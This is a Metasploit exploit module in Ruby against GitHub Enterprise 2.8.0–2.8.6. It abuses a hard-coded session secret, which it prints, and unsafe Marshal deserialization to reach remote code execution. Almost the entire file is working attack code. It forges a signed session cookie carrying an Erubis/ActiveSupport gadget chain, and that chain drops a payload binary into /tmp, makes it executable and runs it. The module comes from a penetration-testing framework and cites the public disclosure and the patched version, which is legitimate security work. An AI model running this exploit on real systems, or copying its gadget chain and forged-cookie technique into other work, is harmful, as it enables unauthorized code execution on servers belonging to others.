##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Github Enterprise Default Session Secret And Deserialization Vulnerability",
      'Description'    => %q{
        This module exploits two security issues in Github Enterprise, version 2.8.0 - 2.8.6.
        The first is that the session management uses a hard-coded secret value, which can be
        abused to sign a serialized malicious Ruby object. The second problem is due to the
        use of unsafe deserialization, which allows the malicious Ruby object to be loaded,
        and results in arbitrary remote code execution.

        This exploit was tested against version 2.8.0.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'iblue <iblue[at]exablue.de>', # Original discovery, writeup, and PoC (he did it all!)
          'sinn3r'                       # Porting the PoC to Metasploit
        ],
      'References'     =>
        [
          [ 'EDB', '41616' ],
          [ 'URL', 'http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html' ],
          [ 'URL', 'https://enterprise.github.com/releases/2.8.7/notes' ] # Patched in this version
        ],
      'Platform'       => 'linux',
      'Targets'        =>
        [
          [ 'Github Enterprise 2.8', { } ]
        ],
      'DefaultOptions' =>
        {
          'SSL'   => true,
          'RPORT' => 8443
        },
      'Privileged'     => false,
      'DisclosureDate' => 'Mar 15 2017',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Github Enterprise', '/'])
      ])
  end

  def secret
    '641dd6454584ddabfed6342cc66281fb'
  end

  def check
    uri = normalize_uri(target_uri.path, 'setup', 'unlock')
    res = send_request_cgi!({
      'method' => 'GET',
      'uri'    => uri,
      'vars_get' =>{
        'redirect_to' => '/'
      }
    })

    unless res
      vprint_error('Connection timed out.')
      return Exploit::CheckCode::Unknown
    end

    unless res.get_cookies.match(/^_gh_manage/)
      vprint_error('No _gh_manage value in cookie found')
      return Exploit::CheckCode::Safe
    end

    cookies = res.get_cookies
    vprint_status("Found cookie value: #{cookies}, checking to see if it can be tampered...")
    gh_manage_value = CGI.unescape(cookies.scan(/_gh_manage=(.+)/).flatten.first)
    data = gh_manage_value.split('--').first
    hmac = gh_manage_value.split('--').last.split(';', 2).first
    vprint_status("Data: #{data.gsub(/\n/, '')}")
    vprint_status("Extracted HMAC: #{hmac}")
    expected_hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
    vprint_status("Expected HMAC: #{expected_hmac}")

    if expected_hmac == hmac
      vprint_status("The HMACs match, which means you can sign and tamper the cookie.")
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def get_ruby_code
    b64_fname = "/tmp/#{Rex::Text.rand_text_alpha(6)}.bin"
    bin_fname = "/tmp/#{Rex::Text.rand_text_alpha(5)}.bin"
    register_file_for_cleanup(b64_fname, bin_fname)
    p = Rex::Text.encode_base64(generate_payload_exe)

    c  = "File.open('#{b64_fname}', 'wb') { |f| f.write('#{p}') }; "
    c << "%x(base64 --decode #{b64_fname} > #{bin_fname}); "
    c << "%x(chmod +x #{bin_fname}); "
    c << "%x(#{bin_fname})"
    c
  end


  def serialize
    # We don't want to run this code within the context of Framework, so we run it as an
    # external process.
    # Brilliant trick from Brent and Adam to overcome the issue.
    ruby_code = %Q|
    module Erubis;class Eruby;end;end
    module ActiveSupport;module Deprecation;class DeprecatedInstanceVariableProxy;end;end;end

    erubis = Erubis::Eruby.allocate
    erubis.instance_variable_set :@src, \\"#{get_ruby_code}; 1\\"
    proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
    proxy.instance_variable_set :@instance, erubis
    proxy.instance_variable_set :@method, :result
    proxy.instance_variable_set :@var, "@result"

    session =
    {
      'session_id' => '',
      'exploit'    => proxy
    }

    print Marshal.dump(session)
    |

    serialized_output = `ruby -e "#{ruby_code}"`

    serialized_object = [serialized_output].pack('m')
    hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, serialized_object)

    return serialized_object, hmac
  end

  def send_serialized_data(dump, hmac)
    uri = normalize_uri(target_uri.path)
    gh_manage_value = CGI.escape("#{dump}--#{hmac}")
    cookie = "_gh_manage=#{gh_manage_value}"
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri,
      'cookie' => cookie
    })

    if res
      print_status("Server returned: #{res.code}")
    end
  end

  def exploit
    dump, hmac = serialize
    print_status('Serialized Ruby stager')

    print_status('Sending serialized Ruby stager...')
    send_serialized_data(dump, hmac)
  end
end

=begin

Handy information:

To deobfuscate Github code, use this script:
https://gist.github.com/wchen-r7/003bef511074b8bc8432e82bfbe0dd42

Github Enterprise's Rack::Session::Cookie saves the session data into a cookie using this
algorithm:

* Takes the session hash (Json) in env['rack.session']
* Marshal.dump the hash into a string
* Base64 the string
* Append a hash of the data at the end of the string to prevent tampering.
* The signed data is saved in _gh_manage'

The format looks like this:

[ DATA ]--[ Hash ]

Also see:
https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb

=end
